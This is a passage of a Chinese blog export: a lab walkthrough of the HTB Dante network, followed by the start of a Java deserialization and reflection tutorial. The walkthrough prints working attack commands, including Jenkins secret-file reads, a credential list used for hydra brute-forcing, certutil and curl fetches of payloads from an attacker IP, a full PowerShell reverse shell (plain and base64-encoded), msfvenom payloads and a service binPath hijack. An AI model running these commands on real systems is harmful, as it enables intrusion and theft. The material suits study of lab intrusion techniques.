proxychains4 java -jar jenkins-cli.jar -s http:&#x2F;&#x2F;172.16.1.19:8080&#x2F; -http help 1 &quot;@&#x2F;var&#x2F;lib&#x2F;jenkins&#x2F;secret.key&quot;  &#x2F;&#x2F;读取密钥
proxychains4 java -jar jenkins-cli.jar -s http:&#x2F;&#x2F;172.16.1.19:8080&#x2F; -http help 1 &quot;@&#x2F;var&#x2F;lib&#x2F;jenkins&#x2F;secrets&#x2F;master.key&quot;  &#x2F;&#x2F;查看加密内容
proxychains4 java -jar jenkins-cli.jar -s http:&#x2F;&#x2F;172.16.1.19:8080&#x2F; -http connect-node &quot;@&#x2F;etc&#x2F;passwd&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>不过没什么用，没有权限读文件选读文件,我们从上面的渗透中得到了一个jenkins的密码<code>Admin_129834765:SamsungOctober102030</code>，用这个密码登陆下：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250219235035042.png" alt="image-20250219235035042"></p>
<p>登陆成功获取第一个flag，然后我们参考<a href="https://www.cnblogs.com/henry666/p/16927188.html%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BC%B9shell%EF%BC%8C%E7%84%B6%E5%90%8Ewget%E4%B8%8B%E8%BD%BDelf%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8C%E4%B8%8A%E7%BA%BF%EF%BC%9A">https://www.cnblogs.com/henry666/p/16927188.html这篇文章进行反弹shell，然后wget下载elf文件进行上线：</a></p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250220002959750.png" alt="image-20250220002959750"></p>
<p>然后进行提权漏洞扫描：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250220004423795.png" alt="image-20250220004423795"></p>
<p>最后使用<code>exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec </code>模块提权成功<br><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250220004513829.png" alt="image-20250220004513829"></p>
<p>然后检查了下这台机器没有其他网段，这台也就完成了。</p>
<h3 id="172-16-1-5"><a href="#172-16-1-5" class="headerlink" title="172.16.1.5"></a>172.16.1.5</h3><p>扫描结果如下：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250217181401974.png" alt="image-20250217181401974"></p>
<p>没有web端口开放，但是445端口开放了，我们先看看能不能进行smb的匿名登陆</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250217184247812.png" alt="image-20250217184247812"></p>
<p>不能进行匿名登陆，然后再看看ftp能不能匿名登陆，发现成功匿名登陆，获得第一个flag：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250217200331438.png" alt="image-20250217200331438"></p>
<p>然后由于他开放了1433端口，我们在上面的渗透中获取到了一个数据库的账号和密码，我们尝试登陆下<code>Sophie|TerrorInflictPurpleDirt996655</code>：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250220010456858.png" alt="image-20250220010456858"></p>
<p>发现成功登入，我们看看其中的数据，和尝试写马，为了方便进行操作。这里通msf来进行操作，先通过<code>impacket-mssqlclient </code>工具将马下载上去:</p>
<pre class="line-numbers language-none"><code class="language-none">proxychains4 impacket-mssqlclient Sophie@172.16.1.5
EXEC xp_cmdshell &quot;mkdir c:\temp&quot;;
EXEC xp_cmdshell &#39;certutil -urlcache -split -f http:&#x2F;&#x2F;10.10.17.141:7412&#x2F;shell.exe C:\temp\file.exe&#39;;
EXEC xp_cmdshell &quot;c:\temp\file.exe&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后获取木马，直接getsystem即可：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250220021931879.png" alt="image-20250220021931879"></p>
<h3 id="172-16-1-1"><a href="#172-16-1-1" class="headerlink" title="172.16.1.1"></a>172.16.1.1</h3><p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218022830212.png" alt="image-20250218022830212"></p>
<h3 id="172-16-1-101"><a href="#172-16-1-101" class="headerlink" title="172.16.1.101"></a>172.16.1.101</h3><p>扫描结果如下：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218005548479.png" alt="image-20250218005548479"></p>
<p>发现只有47001一个端口有web服务，但查看后是404并且扫描后也无结果，所以我们先从smb服务和ftp服务入手，测试之后无法进行匿名登陆</p>
<p>我们加上之前的机器的获得的账号和密码，来进行下ftp密码爆破</p>
<pre class="line-numbers language-none"><code class="language-none">asmith:Princess1
smoggat:Summer2019
tmodle:P45678!
ccraven:Password1
kploty:Teacher65
jbercov:4567Holiday1
whaguey:acb123
dcamtan:WorldOfWarcraft67
tspadly:RopeBlackfieldForwardslash
ematlis:JuneJuly1TY
fglacdon:FinalFantasy7
tmentrso:65RedBalloons
dharding:WestminsterOrange5
smillar:MarksAndSparks91
bjohnston:Bullingdon1
iahmed:Sheffield23
plongbottom:PowerfixSaturdayClub777
jcarrot:Tanenbaum0001
lgesley:SuperStrongCantForget123456789
julian:manchesterunited
ben:Welcometomyblog
balthazar:TheJoker12345!
mrb3n:S3kur1ty2020!
Admin_129834765:SamsungOctober102030<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">proxychains4 hydra -C test1.txt 172.16.1.101 ftp -V<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218212910566.png" alt="image-20250218212910566"></p>
<p>最后密码为：<code>dharding:WestminsterOrange5</code>这一组，我们登陆下，登陆后发现一个<code>Remote login.txt</code>文件</p>
<pre class="line-numbers language-none"><code class="language-none">Dido,
I&#39;ve had to change your account password due to some security issues we have recently become aware of

It&#39;s similar to your FTP password, but with a different number (ie. not 5!)

Come and see me in person to retrieve your password.

thanks,
James<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后我们直接挨个试一遍就行了，尾数字除了5，直接用1-100先试一下，发现17成功</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218220402379.png" alt="image-20250218220402379"></p>
<p>然后我们直接winRM登陆即可：</p>
<pre class="line-numbers language-none"><code class="language-none">proxychains4 evil-winrm -i 172.16.1.101 -u dharding -p WestminsterOrange17<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>登陆后发现第一个flag，然后我们用msf上线，方便后续提权：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218221923139.png" alt="image-20250218221923139"></p>
<p>然后进行提权漏洞扫描</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218222327174.png"></p>
<p>挨个尝试下，最后全试了一遍，也没能成功，所以我们上传下<code>PowerSharpPack</code>来进行漏洞扫描</p>
<pre class="line-numbers language-none"><code class="language-none">proxychains4 evil-winrm -i 172.16.1.101 -u dharding -p WestminsterOrange17 -s &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;tool&#x2F;PowerSharpPack&#x2F;PowerSharpBinaries


Bypass-4MSI
Invoke-winPEAS.ps1
Invoke-winPEAS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>扫描出来下面的关键点</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250219051853836.png" alt="image-20250219051853836"></p>
<p>搜索下之后我们发现存在历史漏洞：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250219052100295.png" alt="image-20250219052100295"></p>
<p>我们先反弹shell出来，用于我们后续进行提权：</p>
<pre class="line-numbers language-none"><code class="language-none">$client &#x3D; New-Object System.Net.Sockets.TCPClient(&#39;10.10.17.141&#39;,9001);$stream &#x3D; $client.GetStream();[byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;;while(($i &#x3D; $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data &#x3D; (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback &#x3D; (iex $data 2&gt;&amp;1 | Out-String );$sendback2 &#x3D; $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte &#x3D; ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>构建bat文件</p>
<pre class="line-numbers language-none"><code class="language-none">@echo off
start &#x2F;b powershell.exe -exec bypass -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA3AC4AMQA0ADEAJwAsADkAMAAwADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA 
exit &#x2F;b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>将文件下载到机器上:</p>
<pre class="line-numbers language-none"><code class="language-none">(New-Object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;10.10.17.141:7412&#x2F;test.bat&#39;,&#39;C:\Users\dharding\Documents\test.bat&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>最后利用漏洞</p>
<pre class="line-numbers language-none"><code class="language-none">sc.exe stop IObitUnSvr
sc.exe config IObitUnSvr binPath&#x3D;&quot;cmd.exe &#x2F;c c:\temp\runme.bat&quot;
sc.exe qc IObitUnSvr
sc.exe start IObitUnSvr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>本地起监听：</p>
<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handler
set PAYLOAD windows&#x2F;shell_reverse_tcp
set LHOST 10.10.14.5
set LPORT 9001
exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最后成功：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250219210939300.png" alt="image-20250219210939300"></p>
<p>同时该台机器也不属于域环境中，这台机器也就结束了：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250219211107928.png" alt="image-20250219211107928"></p>
<h3 id="172-16-1-102"><a href="#172-16-1-102" class="headerlink" title="172.16.1.102"></a>172.16.1.102</h3><p>扫描结果如下：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250217234019908.png" alt="image-20250217234019908"></p>
<p>存在web端口开放，我们先看一眼这个web端口是什么服务，访问之后发现是一个在线婚姻登记系统，有一个管理员登陆和用户登陆，不过登陆上去没有什么用，上传有限制：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250217234516426.png" alt="image-20250217234516426"></p>
<p>我们搜索下这个框架的漏洞，能够搜索到这样一个exp，<a href="https://github.com/ricardojoserf/omrs-rce-exploit">在线婚姻注册系统（OMRS）1.0-远程代码执行</a></p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250217235307163.png" alt="image-20250217235307163"></p>
<p>然后我们就能正常进行命令执行：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218001121187.png" alt="image-20250218001121187"></p>
<p>然后我们也获取了账号和密码<code>552938962</code>|<code>dante123</code> ，然后我们通过从本机下载然后给机器上个马，方便我们后续提权</p>
<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.10.17.141 LPORT&#x3D;6666 -f exe -o shell.exe
use exploit&#x2F;multi&#x2F;handler
set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp
set LHOST 10.10.17.141
set LPORT 6666
exploit -j

proxychains4 python3 exp.py -u http:&#x2F;&#x2F;172.16.1.102:80&#x2F; -c &#39;curl -o shell.exe http:&#x2F;&#x2F;10.10.17.141:7412&#x2F;shell.exe&#39;
proxychains4 python3 exp.py -u http:&#x2F;&#x2F;172.16.1.102:80&#x2F; -c &#39;C:\Apache24\htdocs\user\images\shell.exe&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后就成功上线：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218003437793.png" alt="image-20250218003437793"></p>
<p>然后利用msf的模块进行提权：</p>
<pre class="line-numbers language-none"><code class="language-none">run post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>最后通过下面的模块成功提权</p>
<pre class="line-numbers language-none"><code class="language-none">exploit&#x2F;windows&#x2F;local&#x2F;cve_2023_28252_clfs_driver<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218005027221.png" alt="image-20250218005027221"></p>
<p>然后看了路由表和systeminfo，能够发现其并没有新的域，这台机器也就算是完成了</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218005427059.png" alt="image-20250218005427059"></p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>用时大约半个月，终于完成了这系列靶机，这些靶机还是非常适合像我这种新手练习的，在本套靶机中，我是收益最大的是完整的搭了一次三层代理，我在搭代理的时候，总是有这样那样的问题，最终在各种ai的帮助下，属于是磕磕绊绊的完成了，非常好玩。</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250220022213774.png" alt="image-20250220022213774"></p>
<h3 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h3><p>非常感谢这位师傅的文章，帮了我非常的多</p>
<p><a href="https://dummykitty.github.io/pentest/2024/01/02/HTB-Prolab-Dante.html#windows-1721615">https://dummykitty.github.io/pentest/2024/01/02/HTB-Prolab-Dante.html#windows-1721615</a></p>
]]></content>
      <categories>
        <category>打靶记录</category>
      </categories>
      <tags>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化</title>
    <url>/2024/10/30/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="java反序列化"><a href="#java反序列化" class="headerlink" title="java反序列化"></a>java反序列化</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>序列化与反序列化的意义与php相同，都是为了将字符串对象什么的转化为字节流便于传输，但与php不同的是，java的反序列化是一个接口，表示这个类，或是这个对象可以被反序列化，但具体实现是用<code>ObjectInputStream</code> 和<code>ObjectOutputStream</code>两个类来讲对象或字符串来转为字节流，这与php中的直接用<code>serialize</code>和<code>unserialize</code>来直接进行反序列化时有区别的。在这两个当中：</p>
<ul>
<li>ObjectOutputStream：代表对象输出流，它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。</li>
<li>ObjectInputStream：代表对象输入流，它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。</li>
</ul>
<p>所以在进行反序列化攻击时，前提都是你所寻找的攻击链上的各个类都实现了反序列化的接口。</p>
<p>攻击入口：常见的攻击入口时实现readObject或者重写readObject方法的位置，但是，只要是能由用户自主控制参数，并且进行反序列化的位置就能能当作反序列化攻击的入口。</p>
<p>攻击链：常见的攻击链寻找思路就是直接寻找一个类中的同名函数，通过控制调用函数的顺序来实现调用特定的类</p>
<p>常见执行命令的类：</p>
<ul>
<li><code>java.lang.Runtime</code>类中存在exec方法能够执行命令。</li>
<li><code>java.lang.ProcessBuilder</code>类能创建一个进程，并为该进程提供一组参数，然后启动该进程。</li>
<li><code>Apache Commons Exec</code> 是<code>Apache Commons</code>组件库的一部分，提供了一个简单且功能丰富的 API 来执行外部命令。它提供了 <code>CommandLine</code> 类来构建命令行，以及 <code>DefaultExecutor</code> 类来执行命令。</li>
<li><code>java.lang.Process</code>类来执行外部令。通过调用 <code>Runtime.exec()</code> 或 <code>ProcessBuilder.start()</code> 方法，可以获取到一个 <code>Process</code> 对象，然后可以使用该对象来控制和监视外部进程的执行。</li>
<li>Google Guava 库提供了一个 <code>Exec</code> 类，用于执行外部命令。它提供了简洁的 API 来构建和执行命令。</li>
<li>Spring Framework 提供了一个 <code>ProcessUtils</code> 类，用于执行外部命令。它提供了多个静态方法，用于执行命令并处理执行结果。</li>
</ul>
<p>这些都能够进行命令执行。</p>
<h3 id="反射获取类原型及其方法"><a href="#反射获取类原型及其方法" class="headerlink" title="反射获取类原型及其方法"></a>反射获取类原型及其方法</h3><p>在Java中，反射（Reflection）是指在运行时动态地获取、检查和操作类、对象、方法和字段的能力。它允许程序在运行时通过获取类的信息来操作类的成员和方法，而无需在编写代码时提前知道这些类的具体信息。</p>
<p>常用的通常有以下几个方法：</p>
<ul>
<li><code>Class</code>：表示一个类或接口的元数据，可以通过该类获取类的各种信息。</li>
<li><code>Constructor</code>：表示一个类的构造方法。</li>
<li><code>Method</code>：表示一个类的方法。</li>
<li><code>Field</code>：表示一个类的字段。</li>
</ul>
<p>这些方法的作用如下：</p>
<ul>
<li>获取类信息：通过<code>Class</code>类，我们可以获取一个类的信息，包括类的名称、父类、实现的接口、构造函数和方法等。我们可以使用<code>Class.forName(&quot;类名&quot;)</code>方法或者通过对象的<code>getClass()</code>方法来获取<code>Class</code>对象。</li>
<li>创建对象：通过反射，我们可以使用类的构造函数来动态创建对象。使用<code>Class</code>的<code>newInstance()</code>方法或者通过<code>Constructor</code>类的<code>newInstance()</code>方法，我们可以在运行时创建对象。</li>
<li>调用方法：通过<code>Method</code>类，我们可以调用类的方法。我们可以使用<code>Class</code>的<code>getMethod()</code>方法来获取方法，然后使用<code>Method</code>的<code>invoke()</code>方法来调用方法。这使得我们可以在不知道方法名的情况下，根据运行时的需求来调用特定的方法。</li>
<li>访问和修改字段：通过<code>Field</code>类，我们可以访问和修改类的字段的值。我们可以使用<code>Class</code>的<code>getField()</code>或<code>getDeclaredField()</code>方法来获取字段，然后使用<code>Field</code>的<code>get()</code>和<code>set()</code>方法来获取和设置字段的值。</li>
</ul>
<p>我们通常先用<code>Class</code>类来获取我们想要调用类的原型，再通过下面的方法来获取想要获取的参数</p>
<ul>
<li>获取类范型：<code>Class&lt;?&gt; </code></li>
<li>获取公有和私有方法：<code>getMethods()</code>(公有)、<code>getDeclaredMethods()</code>(私有)</li>
<li>获取公私有参数：<code>getFields()</code>(公有)、<code>getDeclaredFields()</code>(私有)</li>
<li>获取各类方法：</li>
</ul>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Class：表示类的原型，提供了获取构造方法、字段和方法等信息的方法。
getMethods<span class="token punctuation">(</span><span class="token punctuation">)</span>：获取类的所有公有方法。
getDeclaredMethods<span class="token punctuation">(</span><span class="token punctuation">)</span>：获取类的所有方法，包括私有方法。
getFields<span class="token punctuation">(</span><span class="token punctuation">)</span>：获取类的所有公有字段。
getDeclaredFields<span class="token punctuation">(</span><span class="token punctuation">)</span>：获取类的所有字段，包括私有字段。
java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Method：表示类的方法，提供了执行方法和获取方法信息的方法。
java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field：表示类的字段，提供了获取和设置字段值的方法。
java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Constructor：表示类的构造方法，提供了创建类的实例的方法。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>假设现在有一个<code>Person</code>类：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">greet</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello, my name is "</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">" and I'm "</span> <span class="token operator">+</span> age <span class="token operator">+</span> <span class="token string">" years old."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">privateMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"This is a private method."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在这个<code>Person</code>类中存在一个构造参数，一个公有方法和一个私有方法。下面是一个反谁调用它的例子:</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 获取Person类的Class对象</span>
        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Person</span><span class="token punctuation">></span></span> personClass <span class="token operator">=</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>

        <span class="token comment">// 实例化对象</span>
        <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Person</span><span class="token punctuation">></span></span> constructor <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Person</span> person <span class="token operator">=</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"John"</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 获取类的方法</span>
        <span class="token class-name">Method</span> greetMethod <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"greet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Method</span> privateMethod <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"privateMethod"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token comment">// 调用公有方法</span>
        greetMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 调用私有方法</span>
        privateMethod<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 必须设置可访问性</span>
        privateMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 获取和修改字段</span>
        <span class="token class-name">Field</span> nameField <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        nameField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> nameValue <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> nameField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Name: "</span> <span class="token operator">+</span> nameValue<span class="token punctuation">)</span><span class="token punctuation">;</span>

        nameField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>person<span class="token punctuation">,</span> <span class="token string">"Alice"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        person<span class="token punctuation">.</span><span class="token function">greet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出修改后的姓名</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过<code>Class</code>来获取<code>Person</code>的类的对象，然后通过<code>Constructor</code>来实例化对象，再通过<code>Method</code>来调用类的方法，最后再通过<code>Field</code>来获取字段值。</p>
